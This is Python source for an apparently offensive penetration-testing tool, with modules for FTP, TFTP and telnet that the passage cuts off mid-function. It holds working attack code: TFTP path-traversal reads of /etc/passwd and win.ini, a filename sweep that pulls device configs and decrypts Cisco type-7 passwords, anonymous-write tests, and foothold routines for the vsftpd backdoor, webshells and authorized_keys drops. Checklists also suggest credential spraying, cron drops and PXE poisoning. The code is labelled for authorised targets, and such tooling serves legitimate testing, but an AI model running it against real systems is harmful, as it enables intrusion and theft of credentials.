def _tool_ftp_foothold(ip: str, port: int, proto: str) -> str:
    """FTP step 7 tool (INTERACTIVE): pick a viable path to a shell from what the earlier steps
    found — the vsftpd 2.3.4 backdoor (root bind shell :6200), an FTP→web RCE (drop a webshell →
    reverse shell), or a writable dir + SSH (drop authorized_keys → ssh). The operator chooses the
    method when several are viable; each spawns in a new terminal (headless: prints the command).
    Authorised targets only."""
    methods = _ftp_foothold_methods(ip, port)
    if not methods:
        print(f"\n{YELLOW}no automated foothold available yet{RESET} — need one of:\n"
              f"  {DIM}· vsftpd 2.3.4 backdoor (run ftp-banner r1)\n"
              f"  · FTP→web RCE (run ftp-webshell r5)\n"
              f"  · a writable dir + SSH open (run ftp-write r3){RESET}")
        return "ftp-foothold: no automated path (see r1 / r5 / r3)"

    if len(methods) == 1:
        key, _label = methods[0]
    else:
        print(f"\n{BOLD}foothold method{RESET}")
        for i, (_k, label) in enumerate(methods, 1):
            print(f"  {BOLD}{i}{RESET}  {label}")
        v = _ask("pick method [1-N, blank = cancel]:")
        if not v or not v.isdigit() or not 1 <= int(v) <= len(methods):
            print(f"{DIM}cancelled{RESET}")
            return "ftp-foothold: cancelled"
        key = methods[int(v) - 1][0]

    if key == "backdoor":
        return _ftp_fh_backdoor(ip, port)
    if key == "web-rce":
        return _ftp_fh_webrce(ip, port, proto)
    return _ftp_fh_sshkey(ip, port)


# ── FTP step 8: manual steps & further research (reference only, context-aware) ─
def _tool_ftp_next(ip: str, port: int, proto: str) -> str:
    """FTP step-8 tool: NOT a scan — a read-only checklist of manual FTP escalations for when the
    automated steps came up short, with this host's own findings substituted in (viable foothold
    paths, writable dirs, anon loot, proven creds to reuse, internal ports via bounce, phase CVEs,
    and unconfirmed ⚠ hits to verify). Pure DB synthesis; no network."""
    scripts = fetch_scripts(ip, port, proto)
    by_sid = {}
    for sid, out in scripts:
        by_sid.setdefault(sid, out or "")
    banner, anon, write = by_sid.get("ftp-banner", ""), by_sid.get("ftp-anon", ""), by_sid.get("ftp-write", "")
    web, bounce = by_sid.get("ftp-webshell", ""), by_sid.get("ftp-bounce", "")

    mv = re.search(r"^\[\*\] Service:\s*(.+)$", banner, re.M)
    ver = mv.group(1).strip() if mv else ""
    anon_ok = "anonymous login allowed" in anon
    writable = list(dict.fromkeys(re.findall(r"^✗ WRITABLE (\S+)", write, re.M)))
    served = list(dict.fromkeys(re.findall(r"^✗ SERVED (.+)$", web, re.M)))
    rce = "✗ RCE" in web
    creds = _gather_ftp_creds(ip)
    loot = re.findall(r"^! (.+)$", anon, re.M)
    internal = re.findall(r"^✗ BOUNCE 127\.0\.0\.1:(\d+) open\s+\(([^)]+)\)", bounce, re.M)
    ssh_open = any(p == 22 and pr == "tcp" for p, pr, _s in fetch_ports(ip))
    methods = _ftp_foothold_methods(ip, port)

    kev = _load_kev()
    found = set()
    for (p, pr, _sc, _st, cv, _rk, _sm) in fetch_vulns(ip):
        if p == port and pr == proto and cv:
            found |= {c.strip() for c in cv.split(",") if c.strip()}
    for _sid, out in scripts:
        found |= set(re.findall(r"CVE-\d{4}-\d{3,7}", out or ""))
    found = sorted(found, key=_cve_sort_key)

    warns = []
    for sid, out in scripts:
        for ln in (out or "").splitlines():
            s = ln.strip()
            if s.startswith("⚠"):
                warns.append(f"{DIM}[{sid}]{RESET} {s}")
    warns = warns[:14]

    sub = f"{DIM}version: {ver or 'unknown'}  ·  anon: {'yes' if anon_ok else 'no'}"
    sub += f"  ·  proven creds: {len(creds)}"
    if writable:
        sub += f"  ·  writable dir(s): {len(writable)}"
    L = [f"FTP {ip} — manual steps {DIM}(reference only — nothing is scanned here){RESET}", sub + RESET]

    L.append(f"{DIM}▶ shell? → Privilege Escalation phase, step 1 (spawn-shell) — one place, all services{RESET}")
    L.append(f"\n{BOLD}A. Land a shell (if you haven't yet){RESET}")
    if methods:
        for _k, label in methods:
            L.append(f"  {CYAN}ready{RESET} {DIM}→ {label}  ·  Privilege Escalation phase → spawn-shell (r1){RESET}")
    else:
        L.append(f"  {DIM}no automated path yet — try:{RESET}")
        L.append(f"  {DIM}ProFTPD 1.3.5 → SITE CPFR/CPTO (mod_copy, CVE-2015-3306) copy a payload into a web root{RESET}")
        L.append(f"  {DIM}ProFTPD 1.3.3c / telnet IAC · exact banner → searchsploit '{ver or 'ftp'}'{RESET}")

    L.append(f"\n{BOLD}B. Abuse a writable directory{RESET}")
    if writable:
        L.append(f"  {CYAN}writable:{RESET} {', '.join(writable[:6])}")
        L.append(f"  {DIM}if web-served → drop a webshell (ftp-webshell r5) · {'served: ' + served[0] if served else 'map dir↔URL'}{RESET}")
        L.append(f"  {DIM}~/.ssh/authorized_keys (if it's a home dir + SSH open){' — SSH is open' if ssh_open else ''}{RESET}")
        L.append(f"  {DIM}cron.d / cron.hourly drop · .netrc / config poisoning · overwrite a served static file{RESET}")
    else:
        L.append(f"  {DIM}none proven writable — re-test with creds (ftp-write r3 after ftp-creds r4){RESET}")

    L.append(f"\n{BOLD}C. Pivot through the server (FTP bounce){RESET}")
    if internal:
        shown = ", ".join(f"{p} {h}" for p, h in internal[:8])
        L.append(f"  {CYAN}internal open:{RESET} {shown}")
        L.append(f"  {DIM}bounce-scan other internal IPs the same way: PORT <internal-ip> (ftp-bounce r6){RESET}")
    else:
        L.append(f"  {DIM}no internal ports surfaced — retry ftp-bounce (r6), or tunnel once you have a shell{RESET}")

    L.append(f"\n{BOLD}D. Reuse these creds elsewhere{RESET}")
    if creds:
        shown = ", ".join(dict.fromkeys(f"{u}:{p or '<blank>'}" for u, p in creds))[:120]
        L.append(f"  {CYAN}{shown}{RESET} {DIM}→ spray on SSH / SMB / web-login / MSSQL / RDP (password reuse){RESET}")
    else:
        L.append(f"  {DIM}none proven yet — run ftp-creds (r4); then reuse any hit across other services{RESET}")

    L.append(f"\n{BOLD}E. CVEs surfaced in this phase{RESET}")
    if found:
        for c in found:
            ktag = f"  {RED}KEV{RESET}" if c in kev else ""
            L.append(f"  {c}{ktag}  {DIM}https://nvd.nist.gov/vuln/detail/{c}{RESET}")
    else:
        L.append(f"  {DIM}none surfaced — searchsploit the exact banner: '{ver or 'ftp <version>'}'{RESET}")

    L.append(f"\n{BOLD}F. Loot & data{RESET}")
    if loot:
        L.append(f"  {CYAN}interesting file(s):{RESET} {', '.join(l.strip() for l in loot[:6])}"
                 + (f" {DIM}+{len(loot) - 6}{RESET}" if len(loot) > 6 else ""))
    L.append(f"  {DIM}mirror the tree (wget -m ftp://…) · grep configs/backups/.git for creds & DB strings{RESET}")

    L.append(f"\n{BOLD}G. Verify unconfirmed findings from this phase{RESET}")
    if warns:
        for w in warns:
            L.append(f"  {w}")
    else:
        L.append(f"  {DIM}none flagged — nothing sat on the fence{RESET}")

    L.append(f"\n{BOLD}H. Re-run & housekeeping{RESET}")
    L.append(f"  {DIM}after proving creds, re-run ftp-write (r3) / ftp-webshell (r5) with authenticated access{RESET}")
    L.append(f"  {DIM}{'RCE confirmed — Privilege Escalation phase → spawn-shell (r1)' if rce else 'chain writable + web root for RCE (ftp-webshell r5)'}{RESET}")
    return "\n".join(L)


# ══ TFTP (UDP/69) ══ different beast from FTP: no auth, no listing, no banner, no DELETE.
# Only two primitives — RRQ (read) and WRQ (write) — over connectionless UDP. Pure stdlib
# (there is no tftplib); the protocol is a handful of opcodes on a datagram socket.
_TFTP_RRQ, _TFTP_WRQ, _TFTP_DATA, _TFTP_ACK, _TFTP_ERROR = 1, 2, 3, 4, 5


def _tftp_read(ip: str, port: int, filename: str, timeout: float = 4.0,
               max_bytes: int = 65536) -> tuple:
    """Read a file over TFTP (octet mode) on a raw UDP socket. Returns (status, payload):
    ('data', bytes) on success, ('error', 'code:msg') on a TFTP ERROR, ('timeout', '') on silence.
    Handles the server's ephemeral TID, multi-block DATA and ACKs. Read-only."""
    import socket
    import struct
    pkt = struct.pack("!H", _TFTP_RRQ) + filename.encode("latin-1", "replace") + b"\x00octet\x00"
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(timeout)
    data = bytearray()
    try:
        s.sendto(pkt, (ip, port))
        tid, expected = None, 1
        while True:
            try:
                resp, addr = s.recvfrom(1024)
            except socket.timeout:
                return ("data", bytes(data)) if data else ("timeout", "")
            if tid is None:
                tid = addr                                   # lock onto the server's TID
            elif addr != tid:
                continue                                     # ignore strays from other ports
            if len(resp) < 4:
                continue
            op = struct.unpack("!H", resp[:2])[0]
            if op == _TFTP_ERROR:
                code = struct.unpack("!H", resp[2:4])[0]
                msg = resp[4:].split(b"\x00", 1)[0].decode("latin-1", "replace")
                return ("error", f"{code}:{msg}")
            if op == _TFTP_DATA:
                block = struct.unpack("!H", resp[2:4])[0]
                chunk = resp[4:]
                s.sendto(struct.pack("!HH", _TFTP_ACK, block), addr)
                if block == expected:
                    data += chunk
                    expected = (expected + 1) & 0xffff
                    if len(chunk) < 512 or len(data) >= max_bytes:
                        return ("data", bytes(data))
    finally:
        s.close()


# ── TFTP step 1: confirm UDP/69 (no auth) + path-traversal arbitrary read ───────
# Traversal payloads for the classic TFTP daemon read bugs (SolarWinds, tftpd32, HP, …).
# We only ASSERT a vuln when the retrieved bytes actually match the target file's signature —
# no CVE token is emitted (the exact CVE is daemon-specific; see tftp-next / searchsploit).
_TFTP_TRAVERSAL = [
    ("etc/passwd",          re.compile(rb"^\w+:.*:0:0:", re.M),                    "unix", "/etc/passwd"),
    ("windows/win.ini",     re.compile(rb"(?i)\[fonts\]|\[extensions\]"),          "win",  "win.ini"),
    ("boot.ini",            re.compile(rb"(?i)\[boot loader\]"),                   "win",  "boot.ini"),
    ("windows/system32/drivers/etc/hosts", re.compile(rb"(?i)localhost"),         "win",  "hosts"),
]
_TFTP_TRAVERSAL_DEPTHS = (5, 7, 9, 12)


def _tool_tftp_probe(ip: str, port: int, proto: str) -> str:
    """TFTP step 1 tool: confirm the service is live (RRQ a random name → a TFTP ERROR reply proves
    a server, since TFTP has no banner/login), then test directory-traversal reads against the
    classic daemon bugs (SolarWinds / tftpd32 / HP) — content-verified against each file's
    signature. Raw-UDP stdlib, read-only. A silent host raises. Authorised targets only."""
    import os
    lines = []
    probe_name = f"~pshunter_{os.urandom(4).hex()}.probe"
    st, payload = _tftp_read(ip, port, probe_name, timeout=4.0)
    if st == "error":
        code, _, msg = payload.partition(":")
        lines.append(f"[*] TFTP {ip}:{port} answered (ERROR {code} '{msg}') — it's a TFTP server, no auth")
    elif st == "data":
        lines.append(f"[*] TFTP {ip}:{port} answered with DATA — it's a TFTP server, no auth")
    else:
        # one retry — UDP is lossy; a truly dead/filtered service stays silent
        st2, _ = _tftp_read(ip, port, probe_name, timeout=4.0)
        if st2 == "timeout":
            raise RuntimeError(f"{ip}:{port}/udp — no TFTP reply (filtered, or not a TFTP server)")
        lines.append(f"[*] TFTP {ip}:{port} answered on retry — it's a TFTP server, no auth")

    save_services(ip, [{"port": port, "proto": proto, "name": "tftp"}])

    hits, tried = [], 0
    for fname, sig, family, label in _TFTP_TRAVERSAL:
        for depth in _TFTP_TRAVERSAL_DEPTHS:
            sep = "\\" if family == "win" else "/"
            path = (".." + sep) * depth + fname.replace("/", sep)
            tried += 1
            rst, rpl = _tftp_read(ip, port, path, timeout=3.0, max_bytes=8192)
            if rst == "data" and rpl and sig.search(rpl):
                excerpt = rpl.decode("latin-1", "replace").splitlines()[0][:80]
                hits.append((label, path, excerpt))
                break                                        # this file is readable — next target
    if hits:
        for label, path, excerpt in hits:
            lines.append(f"✗ VULN arbitrary file read via path traversal — {label} readable")
            lines.append(f"  {DIM}{path}  →  {excerpt}{RESET}")
    else:
        lines.append(f"· no path-traversal read ({tried} payloads tried) — daemon may be chrooted/patched")
    return f"TFTP probe — {ip}:{port}/udp\n\n" + "\n".join(lines)


# ── TFTP step 2: grab well-known files (no listing → guess names) → grep for creds ─
# TFTP can't list a directory, so enumeration IS filename guessing. This set targets what
# actually lands on a TFTP server in the wild: network-device configs (the richest — they
# leak enable/user creds & SNMP), boot/PXE files, and stray backups/web configs.
_TFTP_WORDLIST = [
    # network device configs — the jackpot (Cisco/Juniper/HP/etc.)
    "running-config", "startup-config", "running.cfg", "startup.cfg", "config.text",
    "config.cfg", "config.txt", "config.xml", "nvram", "router-config", "router.cfg",
    "switch-config", "switch.cfg", "backup-config", "backup.cfg", "cisco.cfg", "confg",
    # VoIP phone provisioning
    "SEPDefault.cnf", "SIPDefault.cnf", "XMLDefault.cnf.xml", "0000000000000.cnf.xml",
    "gk.cfg", "g3.cfg",
    # PXE / boot
    "pxelinux.cfg/default", "pxelinux.0", "boot.ini", "grub.cfg",
    # backups / archives operators drop here
    "backup.tar", "backup.zip", "backup.tgz", "config.bak", "flash.bin",
    # windows / app configs & the odd secret file
    "web.config", "unattend.xml", "sysprep.xml", ".env", "passwd", "shadow", "id_rsa",
]
_TFTPGRAB_DEADLINE = 90          # s — wall-clock cap on the whole sweep
_TFTPGRAB_MAXBYTES = 262144      # per file (256 KiB) — configs are small; don't slurp firmware

# Cisco type-7 is trivially reversible (fixed-key Vigenère) → decrypt to a usable cred.
_C7_KEY = "dsfd;kfoA,.iyewrkldJKDHSUBsgvca69834ncxv9873254k;fg87"


def _cisco_type7(h: str) -> "str | None":
    """Decrypt a Cisco type-7 (password 7 <hex>) string. Returns cleartext or None."""
    try:
        h = h.strip()
        salt, enc = int(h[:2]), h[2:]
        if len(enc) % 2:
            return None
        out = []
        for i in range(0, len(enc), 2):
            b = int(enc[i:i + 2], 16)
            out.append(chr(b ^ ord(_C7_KEY[(salt + i // 2) % len(_C7_KEY)])))
        return "".join(out)
    except Exception:                                        # noqa: BLE001
        return None


def _tftp_config_creds(text: str) -> tuple:
    """Mine a network-device config for creds. Returns (creds, secrets):
    creds = [(user, pw, src)] recovered cleartext (incl. decrypted type-7);
    secrets = [desc] for non-reversible hashes / community strings to note & crack."""
    creds, secrets = [], []
    # username <u> [privilege N] password|secret [<type>] <val> — type decides cleartext vs hash
    for m in re.finditer(r"(?im)^\s*username\s+(\S+)\s+.*?\b(password|secret)\s+(?:([0-9])\s+)?(\S+)", text):
        user, kind, typ, val = m.group(1), m.group(2), m.group(3), m.group(4)
        if typ == "7":
            dec = _cisco_type7(val)
            if dec:
                creds.append((user, dec, "type-7"))
        elif typ in ("5", "8", "9"):
            secrets.append(f"user '{user}' {kind} hash {val[:24]}… (crack: hashcat)")
        else:                                                # no type or type 0 → cleartext
            creds.append((user, val, "cleartext"))
    # enable password|secret [<type>] <val>
    for m in re.finditer(r"(?im)^\s*enable\s+(password|secret)\s+(?:([0-9])\s+)?(\S+)", text):
        kind, typ, val = m.group(1), m.group(2), m.group(3)
        if typ == "7":
            dec = _cisco_type7(val)
            creds.append(("enable", dec or val, "type-7" if dec else "cleartext"))
        elif typ in ("5", "8", "9"):
            secrets.append(f"enable {kind} hash {val[:24]}… (crack: hashcat)")
        else:
            creds.append(("enable", val, "cleartext"))
    # bare line/console password 7 <hex> (vty/con) — not a username/enable line
    for ln in text.splitlines():
        s = ln.strip()
        if s.startswith(("username", "enable")):
            continue
        mm = re.search(r"\bpassword\s+7\s+([0-9A-Fa-f]{4,})\b", s)
        if mm:
            dec = _cisco_type7(mm.group(1))
            if dec:
                creds.append(("(line)", dec, "type-7"))
    for m in re.finditer(r"(?im)^\s*snmp-server\s+community\s+(\S+)\s*(RO|RW)?", text):
        secrets.append(f"SNMP community '{m.group(1)}'{(' ' + m.group(2)) if m.group(2) else ''}")
    return creds, secrets


def _tool_tftp_grab(ip: str, port: int, proto: str) -> str:
    """TFTP step 2 tool: since TFTP can't list a directory, sweep a wordlist of well-known
    filenames (device configs, VoIP/PXE/boot, backups, web configs) via RRQ, grep every retrieved
    file IN MEMORY for creds (Cisco type-7 decrypted, cleartext user/enable) and secrets (type-5/9
    hashes, SNMP communities, API keys via the shared _SECRET_PATTERNS). Nothing is written to
    disk. Read-only. A host that hands back nothing raises. Authorised targets only."""
    import time
    deadline = time.time() + _TFTPGRAB_DEADLINE
    got, creds, secrets = [], [], []
    for name in _TFTP_WORDLIST:
        if time.time() > deadline:
            break
        st, payload = _tftp_read(ip, port, name, timeout=3.0, max_bytes=_TFTPGRAB_MAXBYTES)
        if st != "data" or not payload:
            continue
        got.append((name, len(payload)))
        text = payload.decode("latin-1", "replace")
        c, s = _tftp_config_creds(text)
        for user, pw, src in c:
            creds.append((user, pw, f"{name} {src}"))
        secrets += [f"{d}  ({name})" for d in s]
        for label, snip in _smb_grep_secrets(text):
            secrets.append(f"{label}: {snip}  ({name})")

    if not got:
        raise RuntimeError(f"{ip}:{port}/udp — no known filename retrieved "
                           f"({len(_TFTP_WORDLIST)} tried); guess device-specific names / <hostname>-config")

    creds = list(dict.fromkeys(creds))
    secrets = list(dict.fromkeys(secrets))
    lines = []
    for user, pw, src in creds:
        lines.append(f"✗ CRED {user}:{pw} ({src})")
    for desc in secrets:
        lines.append(f"✗ SECRET {desc}")
    for name, size in got:
        lines.append(f"· FILE {name} ({size} b)")
    lines.append(f"\n[*] {len(got)}/{len(_TFTP_WORDLIST)} filenames retrieved · "
                 f"{len(creds)} cred(s) · {len(secrets)} secret(s) — grepped in memory, nothing saved to disk")
    return f"TFTP grab — {ip}:{port}/udp\n\n" + "\n".join(lines)


# ── TFTP step 3: test write access (WRQ) — non-reversible, TFTP has no DELETE ────
def _tftp_write(ip: str, port: int, filename: str, data: bytes = b"", timeout: float = 4.0) -> tuple:
    """Write a file over TFTP (octet) on a raw UDP socket. Returns ('ok',''), ('error','code:msg')
    or ('timeout',''). Handles the ACK-0 handshake, the server TID, and 512-byte DATA/ACK blocks."""
    import socket
    import struct
    wrq = struct.pack("!H", _TFTP_WRQ) + filename.encode("latin-1", "replace") + b"\x00octet\x00"
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(timeout)
    try:
        s.sendto(wrq, (ip, port))
        tid = None
        while True:                                          # await ACK 0 (server ready) or ERROR
            try:
                resp, addr = s.recvfrom(1024)
            except socket.timeout:
                return ("timeout", "")
            if tid is None:
                tid = addr
            elif addr != tid:
                continue
            if len(resp) < 4:
                continue
            op = struct.unpack("!H", resp[:2])[0]
            if op == _TFTP_ERROR:
                code = struct.unpack("!H", resp[2:4])[0]
                msg = resp[4:].split(b"\x00", 1)[0].decode("latin-1", "replace")
                return ("error", f"{code}:{msg}")
            if op == _TFTP_ACK:
                break
        blocks = [data[i:i + 512] for i in range(0, len(data), 512)] or [b""]
        if data and len(data) % 512 == 0:
            blocks.append(b"")                               # trailing empty block signals EOF
        blk = 1
        for chunk in blocks:
            s.sendto(struct.pack("!HH", _TFTP_DATA, blk) + chunk, tid)
            while True:                                      # await ACK for this block
                try:
                    resp, addr = s.recvfrom(1024)
                except socket.timeout:
                    return ("timeout", "")
                if addr != tid:
                    continue
                op = struct.unpack("!H", resp[:2])[0]
                if op == _TFTP_ERROR:
                    code = struct.unpack("!H", resp[2:4])[0]
                    msg = resp[4:].split(b"\x00", 1)[0].decode("latin-1", "replace")
                    return ("error", f"{code}:{msg}")
                if op == _TFTP_ACK and struct.unpack("!H", resp[2:4])[0] == blk:
                    break
            blk = (blk + 1) & 0xffff
        return ("ok", "")
    finally:
        s.close()


def _tool_tftp_write(ip: str, port: int, proto: str) -> str:
    """TFTP step 3 tool: test anonymous write access by uploading a throwaway marker file (WRQ) and
    reading it back (RRQ) to confirm. CAUTION — TFTP has no DELETE: the marker CANNOT be removed by
    the protocol, so the tool blanks it to zero bytes and reports the exact name to clean up on the
    server filesystem. A read-only server answers with an access-violation (reported, not fatal); a
    silent host raises. Authorised targets only."""
    import os
    marker = f"~pshw_{os.urandom(4).hex()}"
    token = f"pshunter-write-test-{os.urandom(4).hex()}".encode()
    st, detail = _tftp_write(ip, port, marker, token)
    if st == "timeout":
        raise RuntimeError(f"{ip}:{port}/udp — no reply to WRQ (filtered / not a TFTP server)")
    if st == "error":
        code, _, msg = detail.partition(":")
        return (f"TFTP write — {ip}:{port}/udp\n\n"
                f"· write denied (read-only TFTP) — ERROR {code} '{msg}'\n"
                f"· no anonymous write surface here; loot stays read-only (see tftp-grab)")

    rst, payload = _tftp_read(ip, port, marker, timeout=3.0)
    verified = rst == "data" and payload == token
    lines = []
    if verified:
        lines.append(f"✗ WRITABLE {marker}  (anonymous WRQ accepted & read back)")
        _tftp_write(ip, port, marker, b"")                   # blank it — best-effort, can't delete
        lines.append(f"{YELLOW}⚠ TFTP has no DELETE — file left on server (blanked to 0 bytes){RESET}")
        lines.append(f"  {DIM}clean up manually on the box: rm <tftp-root>/{marker}{RESET}")
        lines.append(f"  {DIM}abuse: overwrite a served config / drop authorized_keys / webshell if the "
                     f"root maps somewhere useful — see tftp-next{RESET}")
    else:
        lines.append(f"· WRQ accepted but read-back failed ({rst}) — write may be blind/quarantined")
        lines.append(f"  {DIM}left behind (no DELETE): {marker} — verify & clean up manually{RESET}")
    return f"TFTP write — {ip}:{port}/udp\n\n" + "\n".join(lines)


# ── TFTP step 4: manual steps & further research (reference only, context-aware) ─
def _tool_tftp_next(ip: str, port: int, proto: str) -> str:
    """TFTP step-4 tool: NOT a scan — a read-only checklist of where to go from a TFTP foothold
    (which is always indirect: TFTP gives a file read/write primitive, not a shell), with this
    host's own findings substituted in — traversal read, harvested device creds to reuse, secrets
    to crack, a writable surface, and unconfirmed ⚠ hits. Pure DB synthesis; no network."""
    scripts = fetch_scripts(ip, port, proto)
    by_sid = {}
    for sid, out in scripts:
        by_sid.setdefault(sid, out or "")
    probe, grab, write = by_sid.get("tftp-probe", ""), by_sid.get("tftp-grab", ""), by_sid.get("tftp-write", "")

    reachable = "it's a TFTP server" in probe
    traversal = re.findall(r"^✗ VULN arbitrary file read via path traversal — (.+?) readable$", probe, re.M)
    creds = re.findall(r"^✗ CRED (.+)$", grab, re.M)
    secrets = re.findall(r"^✗ SECRET (.+)$", grab, re.M)
    files = re.findall(r"^· FILE (\S+)", grab, re.M)
    writable = re.findall(r"^✗ WRITABLE (\S+)", write, re.M)

    oports = {(p, pr) for p, pr, _s in fetch_ports(ip)}
    svc = []
    if (22, "tcp") in oports:
        svc.append("SSH")
    if (23, "tcp") in oports:
        svc.append("telnet")
    if (161, "udp") in oports:
        svc.append("SNMP")
    if (80, "tcp") in oports or (443, "tcp") in oports:
        svc.append("web-mgmt")

    kev = _load_kev()
    found = set()
    for (p, pr, _sc, _st, cv, _rk, _sm) in fetch_vulns(ip):
        if p == port and pr == proto and cv:
            found |= {c.strip() for c in cv.split(",") if c.strip()}
    for _sid, out in scripts:
        found |= set(re.findall(r"CVE-\d{4}-\d{3,7}", out or ""))
    found = sorted(found, key=_cve_sort_key)

    warns = []
    for sid, out in scripts:
        for ln in (out or "").splitlines():
            s = ln.strip()
            if s.startswith("⚠"):
                warns.append(f"{DIM}[{sid}]{RESET} {s}")
    warns = warns[:14]

    sub = f"{DIM}reachable: {'yes' if reachable else 'unknown'}  ·  traversal read: {'yes' if traversal else 'no'}"
    sub += f"  ·  creds: {len(creds)}  ·  writable: {'yes' if writable else 'no'}"
    L = [f"TFTP {ip} — manual steps {DIM}(reference only — nothing is scanned here){RESET}", sub + RESET,
         f"{DIM}TFTP is a file read/write primitive, not a shell — the foothold is always indirect{RESET}"]

    L.append(f"\n{BOLD}A. Pull more files{RESET}")
    if traversal:
        L.append(f"  {CYAN}traversal works{RESET} {DIM}({', '.join(traversal[:3])}) → read on: "
                 f"/etc/shadow · ~/.ssh/id_rsa · app configs · (win) SAM/SYSTEM hives, unattend.xml{RESET}")
    else:
        L.append(f"  {DIM}no listing in TFTP — guess device-specific names: <hostname>-config, "
                 f"<model>.cfg, mac-named phone cfgs; learn the hostname via SNMP then re-run tftp-grab (r2){RESET}")

    L.append(f"\n{BOLD}B. Reuse harvested creds (the real foothold){RESET}")
    if creds:
        for c in creds[:8]:
            L.append(f"  {CYAN}{c}{RESET}")
        tgt = ", ".join(svc) if svc else "SSH / telnet / device web-UI / enable"
        L.append(f"  {DIM}→ log in on {tgt}; try as enable/privilege-15; password-reuse across the estate{RESET}")
    else:
        L.append(f"  {DIM}none yet — run tftp-grab (r2); device configs carry enable/user creds{RESET}")

    L.append(f"\n{BOLD}C. Abuse a writable server{RESET}")
    if writable:
        L.append(f"  {CYAN}writable{RESET} {DIM}({writable[0]}) — remember: no DELETE, footprint stays{RESET}")
        L.append(f"  {DIM}overwrite a device config it will re-pull on reboot · drop authorized_keys / a "
                 f"webshell if the root maps to a home/web dir · poison pxelinux.cfg/default for PXE boxes{RESET}")
    else:
        L.append(f"  {DIM}not proven writable — test with tftp-write (r3){RESET}")

    L.append(f"\n{BOLD}D. Known TFTP daemon exploits{RESET}")
    L.append(f"  {DIM}no version banner in TFTP → searchsploit 'tftp' / by daemon: SolarWinds, tftpd32/64, "
             f"HP Intelligent Management, Distinct — dir-traversal & buffer overflows{RESET}")
    if found:
        for c in found:
            ktag = f"  {RED}KEV{RESET}" if c in kev else ""
            L.append(f"  {c}{ktag}  {DIM}https://nvd.nist.gov/vuln/detail/{c}{RESET}")

    L.append(f"\n{BOLD}E. Secrets to crack{RESET}")
    if secrets:
        for s in secrets[:8]:
            L.append(f"  {DIM}{s}{RESET}")
        L.append(f"  {DIM}hashcat: type-5 -m 500 · type-9 -m 9200 · Juniper $9$ decodes offline{RESET}")
    else:
        L.append(f"  {DIM}none captured — device configs (r2) surface enable/user hashes & SNMP communities{RESET}")

    L.append(f"\n{BOLD}F. Loot & pivot{RESET}")
    if files:
        L.append(f"  {CYAN}retrieved:{RESET} {', '.join(files[:6])}"
                 + (f" {DIM}+{len(files) - 6}{RESET}" if len(files) > 6 else ""))
    L.append(f"  {DIM}configs reveal topology, mgmt IPs, VLANs, SNMP — pivot to the devices they name{RESET}")
    L.append(f"  {DIM}SNMP RW community → download/UPLOAD the running-config over SNMP (no TFTP write needed){RESET}")

    L.append(f"\n{BOLD}G. Verify unconfirmed findings from this phase{RESET}")
    if warns:
        for w in warns:
            L.append(f"  {w}")
    else:
        L.append(f"  {DIM}none flagged — nothing sat on the fence{RESET}")

    L.append(f"\n{BOLD}H. Re-run & housekeeping{RESET}")
    L.append(f"  {DIM}learned a hostname/model? re-run tftp-grab (r2) with device-specific filenames{RESET}")
    L.append(f"  {DIM}clean up any ~pshw_* left by tftp-write (no DELETE — manual on the box){RESET}")
    return "\n".join(L)


# ══ Telnet (23) ══ cleartext remote login — a fast HTB foothold via no-auth shells, weak/default
# creds or device backdoors. Raw socket (telnetlib was removed in 3.13): we answer IAC option
# negotiation (refuse everything) so the server sends its banner/prompt, then fingerprint it and,
# when no login is demanded, probe for an unauthenticated shell with a computed marker.
_TELNET_PROMPT_LOGIN = re.compile(r"(?i)(?:login|user\s?name|username)\s*:\s*$")
_TELNET_PROMPT_PASS = re.compile(r"(?i)password\s*:\s*$")


def _telnet_pump(sock, budget: float = 4.0, per_recv: float = 1.5) -> str:
    """Read from a telnet socket for up to `budget` seconds (or until quiet), answering IAC
    option negotiation (DO→WONT, WILL→DONT — refuse all) and stripping IAC/subnegotiation so the
    returned text is just the banner/prompt. The IAC state machine survives recv boundaries."""
    import socket as _s
    import time
    st, opt_cmd = 0, None
    buf, replies = bytearray(), bytearray()
    end = time.time() + budget
    while time.time() < end:
        try:
            sock.settimeout(per_recv)
            chunk = sock.recv(4096)
        except _s.timeout:
            break
        except OSError:
            break
        if not chunk:
            break
        for b in chunk:
            if st == 0:
                buf.append(b) if b != 255 else None
                st = 1 if b == 255 else 0
            elif st == 1:                                    # after IAC
                if b in (251, 252, 253, 254):
                    opt_cmd, st = b, 2
                elif b == 250:
                    st = 3                                   # SB … IAC SE
                elif b == 255:
                    buf.append(255); st = 0
                else:
                    st = 0                                   # other 2-byte command
            elif st == 2:                                    # option byte
                if opt_cmd == 253:
                    replies += bytes((255, 252, b))          # DO  → WONT
                elif opt_cmd == 251:
                    replies += bytes((255, 254, b))          # WILL → DONT
                st = 0
            elif st == 3:
                st = 4 if b == 255 else 3
            elif st == 4:
                st = 0 if b == 240 else 3                    # IAC SE ends subnegotiation
        if replies:
            try:
                sock.sendall(bytes(replies))
            except OSError:
                pass
            replies = bytearray()
    return buf.decode("latin-1", "replace")


def _telnet_fingerprint(banner: str) -> tuple:
    """(product, version) from a telnet banner when recognisable, else (None, None). Captures a
    version when one follows the product name; otherwise returns the product alone."""
    mb = re.search(r"BusyBox v([\d.]+)", banner)
    if mb:
        return "BusyBox", mb.group(1)
    for prod in ("Ubuntu", "Debian", "CentOS", "Red Hat", "Fedora", "OpenWrt", "DD-WRT",
                 "Cisco", "VxWorks", "MikroTik", "Windows"):
        mo = re.search(re.escape(prod) + r"[^\n]*?(\d+(?:\.\d+)+)", banner, re.I)
        if mo:
            return prod, mo.group(1)
        if re.search(r"\b" + re.escape(prod) + r"\b", banner, re.I):
            return prod, None
    return None, None


def _tool_telnet_banner(ip: str, port: int, proto: str) -> str:
    """Telnet step 1 tool: open a raw-socket telnet session, negotiate IAC so the server sends its
    banner/prompt, fingerprint the device/OS/version (→ service record + searchsploit), and — when
    no login is demanded — probe for an UNAUTHENTICATED shell with a computed marker (id + echo
    <mark>$((6*7)); a match proves real execution, not reflection). Non-destructive, read-only.
    A host that doesn't answer telnet raises. Authorised targets only."""
    import socket
    import os
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(8)
        s.connect((ip, port))
    except Exception as exc:                                 # noqa: BLE001
        raise RuntimeError(f"no telnet on {ip}:{port} ({exc})")

    noauth_ctx, asks_login, asks_pass = None, False, False
    try:
        banner = _telnet_pump(s, budget=4.0)
        tail = banner.rstrip()[-80:]
        low = tail.lower()
        asks_login = bool(_TELNET_PROMPT_LOGIN.search(tail)) or "login:" in low
